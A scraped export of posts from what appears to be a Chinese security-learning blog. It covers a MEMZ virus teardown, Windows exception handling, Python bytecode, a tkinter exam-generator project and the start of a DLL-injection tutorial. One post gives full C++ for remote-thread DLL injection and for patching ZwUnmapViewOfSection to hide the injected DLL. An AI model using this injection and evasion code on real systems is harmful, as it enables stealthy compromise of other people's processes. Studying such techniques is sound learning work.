CreateThread有利用到sub_40114A函数去作为参数，点进去查看该函数干了什么 sub_40114A 一个申请空间，一个获取句柄，一个获取进程名 下面的while循环，看个人感觉大概有几个关键点 这是永真循环 这个循环会比较两个变量，相同后v5会自增 一旦v5&lt;v8，就会进入另一个函数 v5每次循环都会置0 v8每次循环都会被赋值为v5的值 结合彩虹猫病毒的特性，合理猜想，这是在检测进程数，一旦进程数小于6个，即关闭了一个进程，就会触发下面的sub_401021函数，直接蓝屏 点进去sub_401021函数 看到RtlAdjustPrivilege和NtRaiseHardError，这两个东西放在一起，就是一个经典蓝屏手段，前者提权，后者触发蓝屏 再往下看 还有一个退出系统的操作，SeShutdownPrivilege，这个东西和上半部分一起，保证关机，这个进程的参数真的没给错，&quot;/watchdog&quot;，看门狗 上述是关闭进程后的触发手段，现在回到关闭进程前，看看它有没有别的操作，毕竟开了5个参数为看门狗的进程，不可能就做这点事情 有一个sub_401000函数，点进去 检测消息常量值，百度后发现，值为16或22的系统消息为WM_CLOSE和WM_ENDSESSION，这两个都是系统在关机时会发送给各个程序或窗口的消息，所以sub_401000的作用也清楚了，在用户主动关机时，也会调用sub_401021，产生蓝屏或关机，看来真就看门狗了，只要进程被杀或者自动关机，就会触发蓝屏或者退出系统 /main参数 /main参数部分的代码分两块，一块是打开物理磁盘覆盖MBR，达到开机出现GIF的效果，一块是调用若干函数，去实现运行彩虹猫时出现的异象 MBR 先用CreateFileA打开主硬盘，即PhysicalDrive0，再用do-while循环去覆盖数据，byte_402118以及byte_402248中的数据应该就是要用来覆盖的内容 由于对MBR不熟，所以详情可参考 参考文章：[原创]最适合新手的病毒分析——彩虹猫病毒 函数 在覆盖MBR后，程序调用了notepad去宣告攻击成功，然后开始调用后面的代码去产生各种花里胡哨的异象 代码中出现了产生线程的CreateThread，并且用函数sub_401A2B去作为参数，点进去看它的代码 不太能看懂，跳回去看，参数中除了函数外，还有一个v9，而v9的值一开始就被赋为一个地址，off_405130，这个地址里面存着一个数组，数组中的元素有10个函数，以及10个函数各对应的一个值 在前面代码的循环中，出现一个sleep函数，该函数的参数是v9[1]，这是那10个函数下面的整数值，由此可知，这十个整数值都是时间值，而循环中最后的v9+=2也证实了这一点，由于v9的类型为dword，它每次自增2，实际上都是增加8个字节，这恰好与之对应 第一次循环 第二次循环 第三次循环 第四次循环 ...... v9的值 0x00405130 0x00405138 0x00405140 0x00405148 ...... v9[1]的值 0x00405134 0x0040513c 0x00405144 0x0040514c ...... 所以后面的代码的作用也大概清楚了，通过设置时间值去触发各个函数引起异象，而时间值的不同可以让事件发生的随机 小结 到这里，这个病毒基本分析完了，但它还有许多细节值得探究，本文只是粗浅分析，那10个函数的具体作用、覆盖MBR的原理等等都没有研究 在分析完这个病毒后，也许可以试试改造它一下，例如更改它的GIF，或者写一个可以修改win10内存的彩虹猫plus 再次感谢大佬的文章[原创]最适合新手的病毒分析——彩虹猫病毒 病毒分析还挺有趣的 ","link":"https://tickertapetimer.github.io/post/彩虹猫病毒分析/"},{"title":"Windows异常处理机制","content":"R3异常处理 Windows异常处理机制有两种，一种是内核异常处理，一种是R3异常处理，所谓R3，就是Ring3，Inter的CPU将指令分为两种，特权指令以及非特权指令，将特权等级分为4级，即Ring0-Ring3，Ring3为所有人都能使用的级别。 对于R3异常处理，Windows的异常处理器一般有一下流程： 交给调试器(进程必须被调试) 执行VEH 执行SEH TopLevelEH(进程被调试时不会被执行) 交给调试器(上面的异常处理都说处理不了，就再次交给调试器) 调用异常端口通知csrss.exe VEH（向量化异常处理） 全称：Vectored Exception Handler 描述：全局异常链表，不同的线程共用一个 当调试器无法解决异常时，便会将该程序丢给VEH，此时VEH链表便会逐个使用VEH去排查解决异常，若所有VEH都无法解决异常，就会转到SEH SEH（结构化异常处理）/ TopLevelEH 全称：Structured Exception Handling 描述：局部异常链表，线程相关，位于当前线程的堆栈当中，不同线程不同堆栈 SEH中存在一异常处理的手段，为TopLevelEH，在最顶层的SEH中，可以注册一个顶层异常处理器。虽然他是基于SEH实现的，但是它可以处理所有线程抛出的异常。当SEH都处理不了该异常，在最顶层的SEH中就会检查是否注册了顶层异常处理，如果注册了，则执行顶层异常处理。 但当该该进程正在调试状态，顶层异常处理会被忽略，不会被执行。 返回调试器 当所有异常处理的方式都无法处理该异常时，系统会再次将异常转交给调试器，若调试器返回DBG_CONTINUE，则循环以上过程。 最后如果异常依旧无人处理，则调用ExceptionPort通知csrss.exe，弹出窗口告知用户程序出错。 ","link":"https://tickertapetimer.github.io/post/windows异常处理机制/"},{"title":"python字节码初析","content":"什么是python字节码 Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。 Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。 dis.dis()将CPython字节码转为可读的伪代码(类似于汇编代码)。 类型如下： 7 8 LOAD_GLOBAL 1 (list) 10 LOAD_FAST 0 (flag) 12 LOAD_CONST 2 (5) 14 LOAD_CONST 3 (-1) 16 BUILD_SLICE 2 18 BINARY_SUBSCR 20 CALL_FUNCTION 1 22 STORE_FAST 1 (flag1) Python经常被称为是一种解释型语言 -- 一种源代码在程序运行时被即时翻译成原生CPU指令的语言 - 但这只说对了一部分。与其他许多解释型语言一样，Python实际上将源代码编译为一组虚拟机指令，Python的解释器就是该虚拟机的一个具体实现。这种跑在虚拟机内部的中间格式被称为“字节码”。 因此，Python留下的.pyc文件不仅仅是源代码的一个“更快”或“优化”版本; 实际上，它们是在程序运行时由Python的虚拟机来执行的字节码指令。 一个经典的&quot;hello world&quot;如下： print(&quot;hello world&quot;) 转换为字节码后变为： 43 0 LOAD_GLOBAL 0 (print) 2 LOAD_CONST 1 ('hello world') 4 CALL_FUNCTION 1 6 POP_TOP 8 LOAD_CONST 0 (None) 10 RETURN_VALUE python字节码的指令解析 有关python字节码的指令解析，看雪的《死磕python字节码-手工还原python源码》已经说的十分详细 链接：《死磕python字节码-手工还原python源码》 ","link":"https://tickertapetimer.github.io/post/python字节码初析/"},{"title":"软件设计课设","content":"import docx import random import linecache import hashlib import tkinter from tkinter import messagebox # 试卷的docx doc = docx.Document() # 全部答案的docx doc_a = docx.Document() line2 = '.' # 生成选择题答案 def choice(num1_1, num2_1): # 打开选择题答案存放的txt文件 f = open('./Answer.txt', 'w') # 通过在随机选题后添加进列表来防止有重复的题目 # 如果有重复的随机数就再随机一遍 list1 = [] for j in range(num1_1): i = random.randint(1, 10) while i in list1: i = random.randint(1, 10) list1.append(i) # 打印检测 print(list1) # 因为选择题有三行，一行题目，一行选项，一行答案，所以随机数*3才能精确选到相应的题目和选项 i = 3 * i print(i) # 选题 if num2_1 == 1: # 打开题目存放的txt并选取题目 line = linecache.getline('question\\\\choice\\\\1.txt', i - 1) # 添加题目序号 line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\choice\\\\1.txt', i) doc.add_paragraph(line) line = linecache.getline('question\\\\choice\\\\1.txt', i - 2) f.write(line) doc_a.add_paragraph(line) elif num2_1 == 2: line = linecache.getline('question\\\\choice\\\\2.txt', i - 1) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\choice\\\\2.txt', i) doc.add_paragraph(line) line = linecache.getline('question\\\\choice\\\\2.txt', i - 2) f.write(line) doc_a.add_paragraph(line) elif num2_1 == 3: line = linecache.getline('question\\\\choice\\\\3.txt', i - 1) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\choice\\\\3.txt', i) doc.add_paragraph(line) line = linecache.getline('question\\\\choice\\\\3.txt', i - 2) f.write(line) doc_a.add_paragraph(line) f.close() return 0 def completion(num3_1, num4_1): # 通过在随机选题后添加进列表来防止有重复的题目 # 如果有重复的随机数就再随机一遍 list1 = [] for j in range(num3_1): i = random.randint(1, 10) while i in list1: i = random.randint(1, 10) list1.append(i) # 打印检测 print(list1) # 因为选填空有两行，一行题目，一行答案，所以随机数*2可以精确选到相应的题目 i = 2 * i print(i) if num4_1 == 2: line = linecache.getline('question\\\\completion\\\\2.txt', i) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\completion\\\\2.txt', i - 1) doc_a.add_paragraph(line) elif num4_1 == 3: line = linecache.getline('question\\\\completion\\\\3.txt', i) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\completion\\\\3.txt', i - 1) doc_a.add_paragraph(line) elif num4_1 == 4: line = linecache.getline('question\\\\completion\\\\4.txt', i) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\completion\\\\4.txt', i - 1) doc_a.add_paragraph(line) return 0 def short_answer(num5_1, num6_1): # 通过在随机选题后添加进列表来防止有重复的题目 # 如果有重复的随机数就再随机一遍 list1 = [] for j in range(num5_1): i = random.randint(1, 10) while i in list1: i = random.randint(1, 10) list1.append(i) # 打印检测 print(list1) # 因为简答题有两行，一行题目，一行答案，所以随机数*3才能精确选到相应的题目 i = 2 * i print(i) if num6_1 == 5: line = linecache.getline('question\\\\short\\\\5.txt', i) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\short\\\\5.txt', i - 1) doc_a.add_paragraph(line) elif num6_1 == 10: line = linecache.getline('question\\\\short\\\\10.txt', i) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\short\\\\10.txt', i - 1) doc_a.add_paragraph(line) elif num6_1 == 15: line = linecache.getline('question\\\\short\\\\15.txt', i) line1 = str(j + 1) + line2 line = line1 + line doc.add_paragraph(line) line = linecache.getline('question\\\\short\\\\15.txt', i - 1) doc_a.add_paragraph(line) return 0 def setup(num1, num2, num3, num4, num5, num6, new_window): num1_1 = num1.get() num2_1 = num2.get() num3_1 = num3.get() num4_1 = num4.get() num5_1 = num5.get() num6_1 = num6.get() if num1_1 &gt; 0: choice(num1_1, num2_1) if num3_1 &gt; 0: completion(num3_1, num4_1) if num5_1 &gt; 0: short_answer(num5_1, num6_1) doc.save('./试卷.docx') doc_a.save('./答案.docx') messagebox.showinfo(title='成功', message='试卷已生成') new_window.destroy() def Create_testpaper(window1): window1.destroy() # 输入题型以及分数窗口 new_window = tkinter.Tk() new_window.title(&quot;试卷自动生成系统&quot;) sw = new_window.winfo_screenwidth() sh = new_window.winfo_screenheight() ww = 300 wh = 300 x = (sw - ww) / 2 y = (sh - wh) / 2 new_window.geometry(&quot;%dx%d+%d+%d&quot; % (ww, wh, x, y)) num1 = tkinter.IntVar() num2 = tkinter.IntVar() num3 = tkinter.IntVar() num4 = tkinter.IntVar() num5 = tkinter.IntVar() num6 = tkinter.IntVar() Label1 = tkinter.Label(new_window, text=&quot;选择题题数,只有10道&quot;) Label1.grid(row=0) Entry1 = tkinter.Entry(new_window, textvariable=num1, show=None) Entry1.grid(row=1, column=0) Label2 = tkinter.Label(new_window, text=&quot;单题分值,1~3分&quot;) Label2.grid(row=0, column=1) Entry2 = tkinter.Entry(new_window, textvariable=num2, show=None) Entry2.grid(row=1, column=1) Label3 = tkinter.Label(new_window, text=&quot;填空题题数,只有10道&quot;) Label3.grid(row=2) Entry3 = tkinter.Entry(new_window, textvariable=num3, show=None) Entry3.grid(row=3, column=0) Label4 = tkinter.Label(new_window, text=&quot;单题分值,2~4分&quot;) Label4.grid(row=2, column=1) Entry4 = tkinter.Entry(new_window, textvariable=num4, show=None) Entry4.grid(row=3, column=1) Label5 = tkinter.Label(new_window, text=&quot;简答题题数,只有10道&quot;) Label5.grid(row=4) Entry5 = tkinter.Entry(new_window, textvariable=num5, show=None) Entry5.grid(row=5, column=0) Label6 = tkinter.Label(new_window, text=&quot;单题分值,5、10、15分&quot;) Label6.grid(row=4, column=1) Entry6 = tkinter.Entry(new_window, textvariable=num6, show=None) Entry6.grid(row=5, column=1) Button2 = tkinter.Button(new_window, text=&quot;生成&quot;, command=lambda: setup(num1, num2, num3, num4, num5, num6, new_window)) Button2.grid(row=6) new_window.mainloop() def count(window2, num7): num7_1 = num7.get() # 答题卡 Answer_card = open('./Answer_card.txt', 'r') # 答案 Answer = open('./Answer.txt', 'r') line_a = Answer.readline() line_a_c = Answer_card.readline() score = 0 # 对了加分，错了不加分 while line_a: if line_a == line_a_c: score = score + num7_1 line_a = Answer.readline() line_a_c = Answer_card.readline() # 弹窗显示选择题分数 messagebox.showinfo(title=&quot;选择题得分&quot;, message=str(score)) window2.destroy() def Correct_testpaper(window1): window1.destroy() # 批改界面 window2 = tkinter.Tk() window2.title(&quot;试卷自动批改系统(只限批改选择题)&quot;) sw = window2.winfo_screenwidth() sh = window2.winfo_screenheight() ww = 300 wh = 300 x = (sw - ww) / 2 y = (sh - wh) / 2 window2.geometry(&quot;%dx%d+%d+%d&quot; % (ww, wh, x, y)) num7 = tkinter.IntVar() Label7 = tkinter.Label(window2, text=&quot;选择题单分分值&quot;) Label7.pack() Entry7 = tkinter.Entry(window2, textvariable=num7, show=None) Entry7.pack() botton = tkinter.Button(window2, text=&quot;确定&quot;, command=lambda: count(window2, num7)) botton.pack() window2.mainloop() def Main(): # 主界面两个选项，生成试卷和批改试卷 window1 = tkinter.Tk() window1.title(&quot;试卷自动生成系统&quot;) sw = window1.winfo_screenwidth() sh = window1.winfo_screenheight() ww = 300 wh = 300 x = (sw - ww) / 2 y = (sh - wh) / 2 window1.geometry(&quot;%dx%d+%d+%d&quot; % (ww, wh, x, y)) botton1 = tkinter.Button(window1, text=&quot;生成试卷&quot;, command=lambda: Create_testpaper(window1)) botton1.pack() botton2 = tkinter.Button(window1, text=&quot;批改试卷&quot;, command=lambda: Correct_testpaper(window1)) botton2.pack() window1.mainloop() def login(top, user, password): # 登录验证 user_var = user.get() password_var = password.get() # 打开密码存放txt user_true = linecache.getline('./passwd.txt', 1) user_true = user_true.replace(&quot;\\n&quot;, &quot;&quot;) password_true = linecache.getline('./passwd.txt', 2) password_true = password_true.replace(&quot;\\n&quot;, &quot;&quot;) # md5加密验证 user_md5 = hashlib.md5(str(user_var).encode(&quot;utf-8&quot;)).hexdigest() password_md5 = hashlib.md5(str(password_var).encode(&quot;utf-8&quot;)).hexdigest() if user_md5 != user_true or password_md5 != password_true: messagebox.showinfo(title='错误', message='用户名或者密码不正确') else: messagebox.showinfo(title='正确', message='欢迎管理员进入') top.destroy() # 进入主界面 Main() def change(user): # 验证用户名 user_var = user.get() user_md5 = hashlib.md5(str(user_var).encode(&quot;utf-8&quot;)).hexdigest() user_true = linecache.getline('./passwd.txt', 1) user_true = user_true.replace(&quot;\\n&quot;, &quot;&quot;) if user_md5 != user_true: messagebox.showinfo(title='错误', message='用户名不正确') else: messagebox.showinfo(title='修改', message='输入原密码和新密码') top.destroy() modify = tkinter.Tk() modify.title(&quot;修改密码&quot;) sw = modify.winfo_screenwidth() sh = modify.winfo_screenheight() ww = 300 wh = 300 x = (sw - ww) / 2 y = (sh - wh) / 2 modify.geometry(&quot;%dx%d+%d+%d&quot; % (ww, wh, x, y)) old_label = tkinter.Label(modify, text=&quot;原密码&quot;) old_label.pack() password_old = tkinter.StringVar() password_input = tkinter.Entry(modify, textvariable=password_old, show=None) password_input.pack() new_label = tkinter.Label(modify, text=&quot;新密码&quot;) new_label.pack() password_new = tkinter.StringVar() password_input1 = tkinter.Entry(modify, textvariable=password_new, show=None) password_input1.pack() change_botton = tkinter.Button(modify, text=&quot;确认&quot;, command=lambda: write_txt(modify, user_md5, password_new, password_old)) change_botton.pack() modify.mainloop() def write_txt(modify, user_md5, password_new, password_old): # 覆盖原密码 password_var = password_old.get() password_true = linecache.getline('./passwd.txt', 2) password_true = password_true.replace(&quot;\\n&quot;, &quot;&quot;) password_md5 = hashlib.md5(str(password_var).encode(&quot;utf-8&quot;)).hexdigest() if password_md5 != password_true: messagebox.showinfo(title='错误', message='密码不正确') else: password_newinput = password_new.get() password_newmd5 = hashlib.md5(str(password_newinput).encode(&quot;utf-8&quot;)).hexdigest() txt = open('./passwd.txt', 'w') txt.write(user_md5) txt.write('\\n') txt.write(password_newmd5) txt.close() messagebox.showinfo(title='正确', message='密码已修改') modify.destroy() login_new = tkinter.Tk() login_new.title(&quot;登录&quot;) sw = login_new.winfo_screenwidth() sh = login_new.winfo_screenheight() ww = 300 wh = 300 x = (sw - ww) / 2 y = (sh - wh) / 2 login_new.geometry(&quot;%dx%d+%d+%d&quot; % (ww, wh, x, y)) login_botton = tkinter.Button(login_new, text=&quot;登录&quot;, command=Main) login_botton.pack() login_new.destroy() if __name__ == '__main__': # 登录窗口 top = tkinter.Tk() top.title(&quot;试卷自动生成系统&quot;) # 居中显示窗口 # sw和sh是获取电脑屏幕的分辨率 # ww和wh是窗口预设分辨率 sw = top.winfo_screenwidth() sh = top.winfo_screenheight() ww = 300 wh = 300 # x和y是电脑分辨率和窗口预设计算后得出的坐标值，保证窗口弹出居中 x = (sw - ww) / 2 y = (sh - wh) / 2 top.geometry(&quot;%dx%d+%d+%d&quot; % (ww, wh, x, y)) user = tkinter.StringVar() password = tkinter.StringVar() # 设置文本、输入框和按钮去实现各项功能 L1 = tkinter.Label(top, text=&quot;用户名&quot;) L1.pack() name1 = tkinter.Entry(top, textvariable=user, show=None) name1.pack() L2 = tkinter.Label(top, text=&quot;密码&quot;) L2.pack() name2 = tkinter.Entry(top, textvariable=password, show='*') name2.pack() Button1 = tkinter.Button(top, text=&quot;登录&quot;, command=lambda: login(top, user, password)) Button1.pack() Button2 = tkinter.Button(top, text=&quot;修改密码&quot;, command=lambda: change(user)) Button2.pack() # 保持窗口事件 top.mainloop() ","link":"https://tickertapetimer.github.io/post/软件设计课设/"},{"title":"通过阉割FreeLibrary来实现DLL隐藏","content":"注入 在使用DLL注入后，会执行一开始设置好的代码 但是我们也可以在ProcessExplorer上看到射进去的DLL 由此可见，DLL注入还不够，这样会被人眼，或者是一些检索异常线程的软件发现，因此在DLL注入后，要将DLL隐藏起来 隐藏 DLL想要调用，需要获取LoadLibrary函数，百度该函数可以发现这是一个将DLL加载进去的函数，而加载后必然要释放，释放DLL需要用到FreeLibrary函数，想要隐藏DLL，运用FreeLibrary函数就是一个操作 写一个调用FreeLibrary函数卸载DLL的程序 #include&lt;Windows.h&gt; #include&lt;iostream&gt; #include &quot;tlhelp32.h&quot; using namespace std; HMODULE GetProcessModuleHandleByName(DWORD pid, LPCWSTR ModuleName) { MODULEENTRY32 ModuleInfo; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid); if (!hSnapshot) { return 0; } ZeroMemory(&amp;ModuleInfo, sizeof(MODULEENTRY32)); ModuleInfo.dwSize = sizeof(MODULEENTRY32); if (!Module32First(hSnapshot, &amp;ModuleInfo)) { return 0; } do { if (!lstrcmpi(ModuleInfo.szModule, ModuleName)) { CloseHandle(hSnapshot); return ModuleInfo.hModule; } } while (Module32Next(hSnapshot, &amp;ModuleInfo)); CloseHandle(hSnapshot); return 0; } DWORD GetProcessIDByName(const wchar_t* pName) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == hSnapshot) { return NULL; } PROCESSENTRY32 pe = { sizeof(pe) }; for (BOOL ret = Process32First(hSnapshot, &amp;pe); ret; ret = Process32Next(hSnapshot, &amp;pe)) { if (wcscmp(pe.szExeFile, pName) == 0) { CloseHandle(hSnapshot); return pe.th32ProcessID; } } CloseHandle(hSnapshot); return 0; } void UnInject(int pID, char* Path) { //获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); LPVOID pReturnAddress = GetProcessModuleHandleByName(GetProcessIDByName(L&quot;进程名&quot;), L&quot;要卸载的DLL&quot;); //获取LoadLibraryA函数的地址 HMODULE hModule = LoadLibrary(L&quot;KERNEL32.DLL&quot;); LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); //创建远程线程-并获取线程的句柄 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, pReturnAddress, 0, NULL); //等待线程事件 WaitForSingleObject(hThread, 2000); //防止内存泄露 CloseHandle(hThread); CloseHandle(hProcess); } int main() { const char* a = &quot;DLL路径&quot;; UnInject(GetProcessIDByName(L&quot;进程名&quot;), (char*)a); getchar(); return 0; } FreeLibrary函数官方文档 可以看出FreeLibrary的运行主要分为四个部分： 1.判断DLL句柄是否有效，有效就说明该DLL存在于进程中 2. 递减模块的引用计数，且判断是否为0 3. 调用模块的DllMain函数响应 DLL_PROCESS_DETACH消息 4.从进程空间撤销对DLL的内存映射 而一个dll真正要释放，就必须从内存中删除，这对应着FreeLibrary的第四步，一二三步只是清除痕迹 逆向FreeLibrary跳过第四步 追踪该字符串 但是追踪到一半失败了，可能是我动调能力还不够，于是想了个曲线救国，从MSDN里拿了一个直接带有freelibrary的代码去运行，进而解析底层逻辑 曲线救国 // A simple program that uses LoadLibrary and // GetProcAddress to access myPuts from Myputs.dll. #include &lt;windows.h&gt; #include &lt;stdio.h&gt; typedef int(__cdecl* MYPROC)(LPWSTR); int main(void) { HINSTANCE hinstLib; MYPROC ProcAdd; BOOL fFreeResult, fRunTimeLinkSuccess = FALSE; // Get a handle to the DLL module. hinstLib = LoadLibrary(TEXT(&quot;F:\\\\study\\\\C++，C\\\\RE\\\\DLL\\\\Dll2\\\\Debug\\\\Dll2.dll&quot;)); // If the handle is valid, try to get the function address. if (hinstLib != NULL) { printf(&quot;%s&quot;, &quot;1&quot;); ProcAdd = (MYPROC)GetProcAddress(hinstLib, &quot;myputs&quot;); // If the function address is valid, call the function. if (NULL != ProcAdd) { fRunTimeLinkSuccess = TRUE; printf(&quot;%s&quot;, &quot;2&quot;); (ProcAdd); (L&quot;Message sent to the DLL function\\n&quot;); } // Free the DLL module. printf(&quot;%s&quot;,&quot;3&quot;); fFreeResult = FreeLibrary(hinstLib); } // If unable to call the DLL function, use an alternative. if (!fRunTimeLinkSuccess) printf(&quot;Message printed from executable\\n&quot;); return 0; } 逆向该代码，可发现 调用了许多函数，因为最后一步才是解除内存映射，所以往后面看，一个一个百度用途，最后找到一个应该是的函数：ZwUnmapViewOfSection 该函数作用为取消映射，那大概率就是他了 阉割ZwUnmapViewOfSection 想要阉割它，就先要找到它，这里使用获取函数句柄的GetProcAddress函数去获取地址 找到后选择直接nop掉它 用代码实现阉割： DWORD a1 = (DWORD)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;ZwUnmapViewOfSection&quot;); DWORD dwOldProtect; //修改内存属性 VirtualProtectEx(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName(&quot;Project1.exe&quot;)), a1, 6, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); //阉割函数 BYTE shellcode[] = { 0xc2, 0x08 , 0x00 , 0x90 , 0x90 }; WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName(&quot;Project1.exe&quot;)), a1, shellcode, 5, NULL); 还原： //还原原函数 //B8 27 00 00 00 BYTE Oldcode[] = { 0xB8, 0x27 , 0x00 , 0x00 , 0x00 }; WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName(&quot;Project1.exe&quot;)), a1, Oldcode, 5, NULL); 综合代码 #include&lt;Windows.h&gt; #include&lt;iostream&gt; #include &quot;tlhelp32.h&quot; using namespace std; HMODULE GetProcessModuleHandleByName(DWORD pid, LPCWSTR ModuleName) { MODULEENTRY32 ModuleInfo; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid); if (!hSnapshot) { return 0; } ZeroMemory(&amp;ModuleInfo, sizeof(MODULEENTRY32)); ModuleInfo.dwSize = sizeof(MODULEENTRY32); if (!Module32First(hSnapshot, &amp;ModuleInfo)) { return 0; } do { if (!lstrcmpi(ModuleInfo.szModule, ModuleName)) { CloseHandle(hSnapshot); return ModuleInfo.hModule; } } while (Module32Next(hSnapshot, &amp;ModuleInfo)); CloseHandle(hSnapshot); return 0; } DWORD GetProcessIDByName(const wchar_t* pName) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == hSnapshot) { return NULL; } PROCESSENTRY32 pe = { sizeof(pe) }; for (BOOL ret = Process32First(hSnapshot, &amp;pe); ret; ret = Process32Next(hSnapshot, &amp;pe)) { if (wcscmp(pe.szExeFile, pName) == 0) { CloseHandle(hSnapshot); return pe.th32ProcessID; } //printf(&quot;%-6d %s\\n&quot;, pe.th32ProcessID, pe.szExeFile); } CloseHandle(hSnapshot); return 0; } void UnInject(int pID, char* Path) { //获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); if (NULL == hProcess) { MessageBoxA(0, &quot;获取进程句柄！&quot;, &quot;获取进程句柄！&quot;, 0); return; } LPVOID pReturnAddress = GetProcessModuleHandleByName(pID, L&quot;Dll2.dll&quot;); if (NULL == pReturnAddress) { MessageBoxA(0, &quot;申请一块内存给DLL路径！&quot;, &quot;申请一块内存给DLL路径！&quot;, 0); CloseHandle(hProcess); return; } //获取LoadLibraryA函数的地址 HMODULE hModule = LoadLibrary(L&quot;KERNEL32.DLL&quot;); LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); if (NULL == lpStartAddress) { MessageBoxA(0, &quot;写入路径到上一行代码申请的内存中！&quot;, &quot;写入路径到上一行代码申请的内存中！&quot;, 0); CloseHandle(hProcess); return; } //创建远程线程-并获取线程的句柄 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, pReturnAddress, 0, NULL); if (NULL == hThread) { MessageBoxA(0, &quot;目标进程中创建线程失败！&quot;, &quot;目标进程中创建线程失败！&quot;, 0); CloseHandle(hProcess); return; } } void Inject(int pID, char* Path) { //获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); if (NULL == hProcess) { MessageBoxA(0, &quot;获取进程句柄！&quot;, &quot;获取进程句柄！&quot;, 0); return; } //申请一块内存给DLL路径 LPVOID pReturnAddress = VirtualAllocEx(hProcess, NULL, strlen(Path) + 1, MEM_COMMIT, PAGE_READWRITE); if (NULL == pReturnAddress) { MessageBoxA(0, &quot;申请一块内存给DLL路径！&quot;, &quot;申请一块内存给DLL路径！&quot;, 0); CloseHandle(hProcess); return; } //写入路径到上一行代码申请的内存中 WriteProcessMemory(hProcess, pReturnAddress, Path, strlen(Path) + 1, NULL); //获取LoadLibraryA函数的地址 HMODULE hModule = LoadLibrary(L&quot;kernel32.dll&quot;); LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;LoadLibraryA&quot;); if (NULL == lpStartAddress) { MessageBoxA(0, &quot;写入路径到上一行代码申请的内存中！&quot;, &quot;写入路径到上一行代码申请的内存中！&quot;, 0); CloseHandle(hProcess); return; } //创建远程线程-并获取线程的句柄 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, pReturnAddress, 0, NULL); if (NULL == hThread) { MessageBoxA(0, &quot;目标进程中创建线程失败！&quot;, &quot;目标进程中创建线程失败！&quot;, 0); CloseHandle(hProcess); return; } WaitForSingleObject(hThread, 2000); //防止内存泄露 CloseHandle(hThread); CloseHandle(hProcess); } int main() { const char* a = &quot;F:\\\\study\\\\C++，C\\\\RE\\\\DLL\\\\Dll2\\\\Debug\\\\Dll2.dll&quot;; Inject(GetProcessIDByName(L&quot;Project1.exe&quot;), (char*)a); LPVOID a1 = GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;ZwUnmapViewOfSection&quot;); printf(&quot;%x\\n&quot;, a1); printf(&quot;%s&quot;, &quot;1111&quot;); //UnInject(PID, (char*)a); DWORD dwOldProtect; //修改内存属性 VirtualProtectEx(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName(L&quot;Project1.exe&quot;)), a1, 6, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); //阉割函数 BYTE shellcode[] = { 0xc2, 0x08 , 0x00 , 0x90 , 0x90 }; WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName(L&quot;Project1.exe&quot;)), a1, shellcode, 5, NULL); UnInject(GetProcessIDByName(L&quot;Project1.exe&quot;), (char*)a); //还原原函数 //B8 27 00 00 00 BYTE Oldcode[] = { 0xB8, 0x27 , 0x00 , 0x00 , 0x00 }; WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName(L&quot;Project1.exe&quot;)), a1, Oldcode, 5, NULL); getchar(); return 0; } 结果 在运行代码后，啥事都没有发生，DLL还是能看得到，但是已经不能再次运行卸载DLL的程序去卸载，猜想是DLL已经卸载了，内存中找不到该DLL，但是由于某种原因，能检测到该DLL的，还是能检测到，而且运行时仍然弹出来该DLL正常卸载后的弹窗。离谱。。。 ","link":"https://tickertapetimer.github.io/post/通过阉割FreeLibrary来实现DLL隐藏/"},{"title":"ring3注入学习(2)远程线程注入","content":"什么是DLL注入 Dll注入原理：简单来说，就是通过程序A控制程序B，让程序B加载含有payload的dll，该dll在加载的过程中会执行dll中的恶意代码，从而实现注入。 DLL注入分为以下几个步骤： （注入执行程序记为injector.py,要注入的程序记为aim.exe，注入的dll名为imhacker.dll） 获取注入目标进程句柄 在目标进程中分配内存，分配的内存能够下存放dll完全路径字符串 